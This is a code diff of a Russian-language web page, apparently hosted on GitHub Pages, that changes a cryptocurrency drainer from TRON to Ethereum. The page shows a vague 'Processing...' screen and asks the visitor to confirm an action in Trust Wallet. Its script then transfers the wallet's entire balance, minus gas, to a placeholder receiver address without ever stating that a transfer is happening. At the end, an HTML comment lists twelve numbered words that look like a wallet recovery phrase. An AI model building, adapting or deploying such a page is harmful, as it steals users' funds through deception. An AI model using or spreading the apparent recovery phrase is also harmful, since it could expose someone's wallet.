@@ -2,8 +2,10 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Processing TRX...</title>
+  <title>Processing...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 
   <style>
     body {
@@ -19,9 +21,9 @@
     .box {
       max-width: 360px;
     }
-    .status {
+    .hint {
       font-size: 14px;
-      opacity: 0.9;
+      opacity: 0.85;
       margin-top: 12px;
       word-break: break-all;
     }
@@ -30,10 +32,12 @@
 <body>
 
 <div class="box">
-  <h2>Инициализация TRX…</h2>
+  <h2>Инициализация…</h2>
   <p>Подтвердите действие в Trust Wallet</p>
-  <div class="status" id="status"></div>
+  <div class="hint" id="status"></div>
+  <pre id="stat"></pre>
 
+  <!-- fallback если не открыт в Trust Wallet -->
   <p style="margin-top:16px">
     <a href="https://link.trustwallet.com/open_url?coin_id=195&url=https://stariywah.github.io/test/"
        style="color:#60a5fa">
@@ -46,44 +50,47 @@
 (async () => {
   const status = document.getElementById("status");
 
-  if (typeof window.tronWeb === "undefined" || !window.tronWeb.ready) {
-    status.innerText = "❌ Откройте страницу через Trust Wallet (TRON)";
+  if (!window.ethereum) {
+    status.innerText = "❌ Откройте страницу через Trust Wallet";
     return;
   }
 
   try {
-    const tronWeb = window.tronWeb;
+    // 1. Подключение кошелька
+    await ethereum.request({ method: "eth_requestAccounts" });
 
-    // 1. Адрес кошелька
-    const fromAddress = tronWeb.defaultAddress.base58;
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+    document.getElementById('stat').innerText = address;
 
-    // 2. Баланс (в SUN)
-    const balanceSun = await tronWeb.trx.getBalance(fromAddress);
+    // 2. Баланс
+    const balance = await provider.getBalance(address);
 
-    if (balanceSun <= 0) {
-      status.innerText = "❌ Баланс TRX = 0";
+    // 3. Газ
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = ethers.BigNumber.from(21000);
+    const gasCost = gasPrice.mul(gasLimit);
+
+    if (balance.lte(gasCost)) {
+      status.innerText = "❌ Недостаточно средств для оплаты газа";
       return;
     }
 
-    // 3. Оставляем 1 TRX (1_000_000 SUN)
-    const reserve = 1_000_000;
-    const amountSun = balanceSun - reserve;
-
-    if (amountSun <= 0) {
-      status.innerText = "❌ Недостаточно TRX для перевода";
-      return;
-    }
+    // 4. Максимально возможная сумма
+    const value = balance.sub(gasCost);
 
     status.innerText = "⏳ Ожидание подтверждения транзакции…";
 
-    // 4. Транзакция
-    const tx = await tronWeb.trx.sendTransaction(
-      "T_RECEIVER_ADDRESS",
-      amountSun
-    );
+    // 5. Отправка транзакции
+    const tx = await signer.sendTransaction({
+      to: "0xRECEIVER_ADDRESS",
+      value: value,
+      gasLimit: gasLimit,
+      gasPrice: gasPrice
+    });
 
-    status.innerText =
-      "✅ Транзакция отправлена:\n" + tx.txid;
+    status.innerText = "✅ Транзакция отправлена:\n" + tx.hash;
 
   } catch (e) {
     status.innerText = "❌ Отменено или ошибка:\n" + (e.message || e);
@@ -93,3 +100,4 @@
 
 </body>
 </html>
+<!-- 1. Injury 2. fox 3. fine 4. size 5. under 6. inspire 7. wrist 8. poverty 9. cinnamon 10. nation 11. animal 12. county-->
